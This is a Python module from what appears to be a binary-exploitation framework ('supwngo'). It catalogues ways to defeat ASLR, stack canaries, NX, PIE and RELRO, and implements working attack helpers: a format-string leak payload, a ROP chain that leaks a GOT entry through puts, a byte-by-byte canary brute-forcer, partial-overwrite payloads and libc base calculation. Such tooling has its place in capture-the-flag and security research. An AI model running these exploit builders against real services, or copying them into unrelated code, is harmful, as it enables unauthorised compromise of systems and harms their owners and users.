"""
Protection bypass strategies.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext
from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class BypassStrategy:
    """A protection bypass strategy."""
    name: str
    protection: str
    description: str
    requirements: List[str] = field(default_factory=list)
    success_rate: float = 0.0


class ProtectionBypass:
    """
    Strategies for bypassing modern protections.

    Covers:
    - ASLR bypass (leaks, brute force, partial overwrite)
    - Stack canary bypass (leak, brute force)
    - NX bypass (ROP, ret2libc, mprotect)
    - PIE bypass (partial overwrite, leak)
    - RELRO bypass (hooks, return address)
    """

    def __init__(self, context: ExploitContext):
        """
        Initialize bypass strategies.

        Args:
            context: Exploitation context
        """
        self.context = context
        self.binary = context.binary
        self.bits = context.bits
        self.pack = p64 if self.bits == 64 else p32

    def get_applicable_strategies(self) -> List[BypassStrategy]:
        """
        Get applicable bypass strategies for current context.

        Returns:
            List of applicable strategies
        """
        strategies = []
        prots = self.context.protections

        if prots.aslr:
            strategies.extend(self._get_aslr_strategies())

        if prots.canary:
            strategies.extend(self._get_canary_strategies())

        if prots.nx:
            strategies.extend(self._get_nx_strategies())

        if prots.pie:
            strategies.extend(self._get_pie_strategies())

        if prots.relro in ["Partial RELRO", "Full RELRO"]:
            strategies.extend(self._get_relro_strategies())

        return strategies

    def _get_aslr_strategies(self) -> List[BypassStrategy]:
        """Get ASLR bypass strategies."""
        return [
            BypassStrategy(
                name="information_leak",
                protection="ASLR",
                description="Leak libc/stack/heap address to defeat ASLR",
                requirements=["Format string or buffer read primitive"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="partial_overwrite",
                protection="ASLR",
                description="Overwrite only lower bytes (12-bit entropy)",
                requirements=["Buffer overflow with 2+ byte control"],
                success_rate=1.0 / 4096,  # 12-bit brute force
            ),
            BypassStrategy(
                name="brute_force_32bit",
                protection="ASLR",
                description="Brute force 32-bit ASLR (8-bit entropy)",
                requirements=["32-bit system", "Crash tolerance"],
                success_rate=1.0 / 256,
            ),
            BypassStrategy(
                name="ret2plt",
                protection="ASLR",
                description="Use PLT entries (fixed addresses without PIE)",
                requirements=["PIE disabled", "Useful PLT functions"],
                success_rate=0.99,
            ),
            BypassStrategy(
                name="ret2dlresolve",
                protection="ASLR",
                description="Resolve arbitrary function without leak",
                requirements=["Stack control", "Writable memory"],
                success_rate=0.85,
            ),
        ]

    def _get_canary_strategies(self) -> List[BypassStrategy]:
        """Get canary bypass strategies."""
        return [
            BypassStrategy(
                name="leak_canary",
                protection="Canary",
                description="Leak canary via format string or buffer over-read",
                requirements=["Information disclosure primitive"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="brute_force_canary",
                protection="Canary",
                description="Brute force canary byte-by-byte (fork servers)",
                requirements=["Fork-based server", "Byte-by-byte overflow"],
                success_rate=0.99,  # 256 * 7 attempts for 64-bit
            ),
            BypassStrategy(
                name="overwrite_canary",
                protection="Canary",
                description="Overwrite canary with itself (if known)",
                requirements=["Canary value known"],
                success_rate=1.0,
            ),
            BypassStrategy(
                name="thread_local_overwrite",
                protection="Canary",
                description="Overwrite TLS canary reference",
                requirements=["Large overflow", "Known TLS offset"],
                success_rate=0.7,
            ),
        ]

    def _get_nx_strategies(self) -> List[BypassStrategy]:
        """Get NX bypass strategies."""
        return [
            BypassStrategy(
                name="rop_chain",
                protection="NX",
                description="Use ROP gadgets for code execution",
                requirements=["Stack control", "Available gadgets"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="ret2libc",
                protection="NX",
                description="Return to libc functions (system, execve)",
                requirements=["Libc address", "Argument control"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="mprotect",
                protection="NX",
                description="Call mprotect to make memory executable",
                requirements=["Control of mprotect args", "Stack for shellcode"],
                success_rate=0.85,
            ),
            BypassStrategy(
                name="jit_spray",
                protection="NX",
                description="Spray JIT-compiled code (browsers)",
                requirements=["JIT engine", "Controllable JIT input"],
                success_rate=0.6,
            ),
        ]

    def _get_pie_strategies(self) -> List[BypassStrategy]:
        """Get PIE bypass strategies."""
        return [
            BypassStrategy(
                name="leak_binary_base",
                protection="PIE",
                description="Leak binary address to calculate base",
                requirements=["Information leak primitive"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="partial_overwrite_pie",
                protection="PIE",
                description="Partial overwrite (page-aligned targets)",
                requirements=["Overflow with 1-2 byte control"],
                success_rate=1.0 / 4096,
            ),
            BypassStrategy(
                name="relative_addressing",
                protection="PIE",
                description="Use relative offsets instead of absolute",
                requirements=["Control of relative offset"],
                success_rate=0.9,
            ),
        ]

    def _get_relro_strategies(self) -> List[BypassStrategy]:
        """Get RELRO bypass strategies."""
        full = self.context.protections.relro == "Full RELRO"

        strategies = []

        if not full:
            strategies.append(BypassStrategy(
                name="got_overwrite",
                protection="Partial RELRO",
                description="Overwrite GOT entry to hijack function",
                requirements=["Arbitrary write primitive"],
                success_rate=0.95,
            ))

        strategies.extend([
            BypassStrategy(
                name="malloc_hook",
                protection="Full RELRO",
                description="Overwrite __malloc_hook (deprecated but still works)",
                requirements=["Libc address", "Write primitive"],
                success_rate=0.9,
            ),
            BypassStrategy(
                name="free_hook",
                protection="Full RELRO",
                description="Overwrite __free_hook",
                requirements=["Libc address", "Write primitive"],
                success_rate=0.9,
            ),
            BypassStrategy(
                name="exit_handlers",
                protection="Full RELRO",
                description="Overwrite __exit_funcs or TLS dtors",
                requirements=["Libc address", "Write primitive"],
                success_rate=0.8,
            ),
            BypassStrategy(
                name="return_address",
                protection="Full RELRO",
                description="Overwrite return address on stack",
                requirements=["Stack buffer overflow"],
                success_rate=0.95,
            ),
        ])

        return strategies

    def leak_libc_address(
        self,
        method: str = "format_string",
    ) -> Dict[str, Any]:
        """
        Build payload to leak libc address.

        Args:
            method: Leak method (format_string, puts, write)

        Returns:
            Leak strategy info
        """
        result = {
            "method": method,
            "payload": b"",
            "parse_func": None,
        }

        if method == "format_string":
            # Leak with %p
            result["payload"] = b"%p." * 20 + b"\n"
            result["parse_func"] = self._parse_format_leak

        elif method == "puts":
            # Use puts to leak GOT entry
            if self.binary and "puts" in self.binary.plt:
                puts_plt = self.binary.plt["puts"]
                puts_got = self.binary.got.get("puts", 0)

                result["payload"] = self._build_puts_leak(puts_plt, puts_got)

        return result

    def _parse_format_leak(self, output: bytes) -> List[int]:
        """Parse format string leak output."""
        addresses = []
        for part in output.split(b"."):
            if part.startswith(b"0x"):
                try:
                    addr = int(part, 16)
                    if addr > 0x1000:  # Filter small values
                        addresses.append(addr)
                except ValueError:
                    continue
        return addresses

    def _build_puts_leak(self, puts_plt: int, target_got: int) -> bytes:
        """Build ROP chain to leak with puts."""
        chain = []

        # Find pop rdi gadget
        from supwngo.exploit.rop.gadgets import GadgetFinder
        finder = GadgetFinder(self.binary)
        pop_rdi = finder.find_pop_reg("rdi")

        if pop_rdi:
            chain.append(self.pack(pop_rdi.address))
            chain.append(self.pack(target_got))
            chain.append(self.pack(puts_plt))

        return b"".join(chain)

    def brute_force_canary(
        self,
        overflow_func: callable,
        offset: int,
    ) -> Optional[int]:
        """
        Brute force stack canary byte-by-byte.

        Args:
            overflow_func: Function to send overflow payload
            offset: Offset to canary

        Returns:
            Canary value or None
        """
        canary = bytearray(8 if self.bits == 64 else 4)
        canary[0] = 0x00  # Canaries start with null byte

        for i in range(1, len(canary)):
            for byte in range(256):
                canary[i] = byte
                payload = b"A" * offset + bytes(canary[:i + 1])

                try:
                    result = overflow_func(payload)
                    if result:  # Process didn't crash
                        break
                except Exception:
                    continue
            else:
                logger.warning(f"Failed to find canary byte {i}")
                return None

        return int.from_bytes(canary, 'little')

    def partial_overwrite(
        self,
        target_offset: int,
        new_low_bytes: bytes,
    ) -> bytes:
        """
        Build partial overwrite payload.

        Args:
            target_offset: Offset to target address
            new_low_bytes: New low bytes (1-2 bytes)

        Returns:
            Payload bytes
        """
        return b"A" * target_offset + new_low_bytes

    def calculate_libc_base(
        self,
        leaked_addr: int,
        symbol: str,
    ) -> Optional[int]:
        """
        Calculate libc base from leaked address.

        Args:
            leaked_addr: Leaked libc address
            symbol: Symbol name for leaked address

        Returns:
            Libc base address or None
        """
        if not self.context.libc.path:
            return None

        try:
            from pwn import ELF
            libc = ELF(str(self.context.libc.path))
            offset = libc.symbols.get(symbol, 0)
            if offset:
                return leaked_addr - offset
        except Exception:
            pass

        return None

    def suggest_best_strategy(self) -> Optional[BypassStrategy]:
        """
        Suggest best bypass strategy for current context.

        Returns:
            Best strategy or None
        """
        strategies = self.get_applicable_strategies()

        if not strategies:
            return None

        # Sort by success rate
        strategies.sort(key=lambda s: s.success_rate, reverse=True)

        return strategies[0]

    def summary(self) -> str:
        """Get bypass summary."""
        strategies = self.get_applicable_strategies()

        lines = [
            "Protection Bypass Summary",
            "=" * 40,
            f"Protections active:",
            f"  ASLR: {self.context.protections.aslr}",
            f"  Canary: {self.context.protections.canary}",
            f"  NX: {self.context.protections.nx}",
            f"  PIE: {self.context.protections.pie}",
            f"  RELRO: {self.context.protections.relro}",
            "",
            f"Applicable strategies: {len(strategies)}",
        ]

        for s in strategies[:5]:
            lines.append(f"  - {s.name} ({s.protection}): {s.success_rate:.1%}")

        return "\n".join(lines)
